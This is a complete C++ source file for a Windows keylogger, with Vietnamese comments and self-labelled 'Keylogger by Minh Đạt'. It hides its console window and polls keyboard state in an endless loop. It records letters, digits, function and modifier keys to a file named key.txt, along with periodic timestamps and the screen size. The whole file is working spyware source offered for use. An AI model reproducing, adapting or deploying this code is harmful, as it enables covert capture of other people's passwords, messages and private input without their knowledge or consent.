#ifdef _MSC_VER
#define _CRT_SECURE_NO_WARNINGS
#endif  // Tránh lỗi mảng time

#include <iostream>
#include <Windows.h>
#include <fstream>
#include <string>
#include <ctime>

using namespace std;

void TaoFile_GhiFile(string kitubanphim)
{
	fstream taofile;
	taofile.open("key.txt", ios::app | ios::out);    // Tạo file key.txt và ghi file. Nếu như đã có file thì ghi file và viết vào cuối file
	taofile << kitubanphim;     // Cho đoạn chữ của biến kitubanphim vào file key.txt
	taofile.close();    // Đóng ghi file
}

void thoigian() 
{
	int chieudai = GetSystemMetrics(SM_CXSCREEN);
	int chieurong = GetSystemMetrics(SM_CYSCREEN);

	time_t timehientai = time(0);
	char* abc = ctime(&timehientai);

	fstream taofile;
	taofile.open("key.txt", ios::app | ios::out);
	taofile << "\nTime : " << abc << "===============================================\n";
	taofile << "Kich thuoc man hinh : \n" << "Chieu dai : " << chieudai << " pixels" << "\n" << "Chieu rong : " << chieurong << " pixels" << "\n";
	taofile << "===============================================\n";
	taofile.close();
}

int Update = 0;

int main() 
{

	FreeConsole();
	SetConsoleTitle(L"Keylogger by Minh Đạt");

	TaoFile_GhiFile("\nCreate by : Minh Dat\n");
	thoigian();

	while (1) 
	{
		for (int key = 65; key <= 90; key++)   // Phím chữ 
		{
			if (GetAsyncKeyState(key) & 1)
			{
				fstream taofile;
				taofile.open("key.txt", ios::app | ios::out);
				taofile << "[" << char(key) << "]";
				taofile.close();
			}
		}

		for (int key = 48; key <= 57; key++)   // Phím số
		{
			if (GetAsyncKeyState(key) & 1)
			{
				fstream taofile;
				taofile.open("key.txt", ios::app | ios::out);
				taofile << "[" << char(key) << "]";
				taofile.close();
			}
		}

		// ============================================= Phím F
		if (GetAsyncKeyState(VK_F1) & 1)
		{
			TaoFile_GhiFile("\n[F1]\n");
		}
		if (GetAsyncKeyState(VK_F2) & 1)
		{
			TaoFile_GhiFile("\n[F2]\n");
		}
		if (GetAsyncKeyState(VK_F3) & 1)
		{
			TaoFile_GhiFile("\n[F3]\n");
		}
		if (GetAsyncKeyState(VK_F4) & 1)
		{
			TaoFile_GhiFile("\n[F4]\n");
		}
		if (GetAsyncKeyState(VK_F5) & 1)
		{
			TaoFile_GhiFile("\n[F5]\n");
		}
		if (GetAsyncKeyState(VK_F6) & 1)
		{
			TaoFile_GhiFile("\n[F6]\n");
		}
		if (GetAsyncKeyState(VK_F7) & 1)
		{
			TaoFile_GhiFile("\n[F7]\n");
		}
		if (GetAsyncKeyState(VK_F8) & 1)
		{
			TaoFile_GhiFile("\n[F8]\n");
		}
		if (GetAsyncKeyState(VK_F9) & 1)
		{
			TaoFile_GhiFile("\n[F9]\n");
		}
		if (GetAsyncKeyState(VK_F10) & 1)
		{
			TaoFile_GhiFile("\n[F10]\n");
		}
		if (GetAsyncKeyState(VK_F11) & 1)
		{
			TaoFile_GhiFile("\n[F11]\n");
		}
		if (GetAsyncKeyState(VK_F12) & 1)
		{
			TaoFile_GhiFile("\n[F12]\n");
		}
		// ============================================= Phím F

		// ============================================= Phím Chức năng
		if (GetAsyncKeyState(VK_LSHIFT) & 1)
		{
			TaoFile_GhiFile("\n[LEFT SHIFT]\n");
		}
		if (GetAsyncKeyState(VK_RSHIFT) & 1)
		{
			TaoFile_GhiFile("\n[RIGHT SHIFT]\n");
		}
		if (GetAsyncKeyState(VK_LCONTROL) & 1)
		{
			TaoFile_GhiFile("\n[LEFT CTRL]\n");
		}
		if (GetAsyncKeyState(VK_RCONTROL) & 1)
		{
			TaoFile_GhiFile("\n[RIGHT CTRL]\n");
		}
		if (GetAsyncKeyState(VK_LMENU) & 1)
		{
			TaoFile_GhiFile("\n[LEFT ALT]\n");
		}
		if (GetAsyncKeyState(VK_RMENU) & 1)
		{
			TaoFile_GhiFile("\n[RIGHT ALT]\n");
		}
		if (GetAsyncKeyState(VK_CAPITAL) & 1)
		{
			TaoFile_GhiFile("\n[CAPS LOCK]\n");
		}
		if (GetAsyncKeyState(VK_RETURN) & 1)
		{
			TaoFile_GhiFile("\n[ENTER]\n");
		}
		if (GetAsyncKeyState(VK_TAB) & 1)
		{
			TaoFile_GhiFile("\n[TAB]\n");
		}
		if (GetAsyncKeyState(VK_BACK) & 1)
		{
			TaoFile_GhiFile("\n[BACKSPACE]\n");
		}
		if (GetAsyncKeyState(VK_DELETE) & 1) 
		{
			TaoFile_GhiFile("\n[DELETE]\n");
		}
		if (GetAsyncKeyState(VK_INSERT) & 1)
		{
			TaoFile_GhiFile("\n[INSERT]\n");
		}
		if (GetAsyncKeyState(VK_SNAPSHOT) & 1)
		{
			TaoFile_GhiFile("\n[Chup Man Hinh]\n");
		}
		if (GetAsyncKeyState(VK_ESCAPE) & 1)
		{
			TaoFile_GhiFile("\n[ESC]\n");
		}
		if (GetAsyncKeyState(VK_SPACE) & 1)
		{
			TaoFile_GhiFile("\n[SPACE]\n");
		}
		// ============================================= Phím Chức năng
		Sleep(30);

		Update++;
		if (Update == 10000)   // Hỗ trợ thời gian bằng cách dựa vào Sleep(30);
		{
			Update = 0;
			thoigian();
		}

	}
}